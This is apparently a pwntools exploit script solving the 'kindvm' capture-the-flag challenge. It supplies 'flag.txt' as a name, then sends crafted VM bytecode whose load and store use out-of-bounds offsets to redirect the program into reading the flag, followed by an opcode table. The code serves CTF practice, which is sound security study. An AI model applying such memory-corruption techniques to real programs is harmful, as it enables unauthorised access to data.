#! /usr/bin/python
from pwn import *

r = process('./kindvm')

payload = 'flag.txt'
r.sendlineafter('Input your name : ',payload)

payload2 = ''
payload2 += '\x01'      # load()  *(reg+0) = *(mem-40)
payload2 += '\x00' 
payload2 += '\xff\xd8'
payload2 += '\x02'      # store() *(mem-36) = *(reg+0)
payload2 += '\xff\xdc'
payload2 += '\x00'
payload2 += '\x06'      # halt()
r.sendlineafter('Input instruction : ',payload2)

r.interactive()
'''
\x00 nop
\x01 load  _8, _16
\x02 store _16, _8
\x03 mov   _8, _8
\x04 add   _8, _8
\x05 sub   _8, _8
\x06 halt  
\x07 in    _8, _32
\x08 out   _8
\x09 hint  
'''
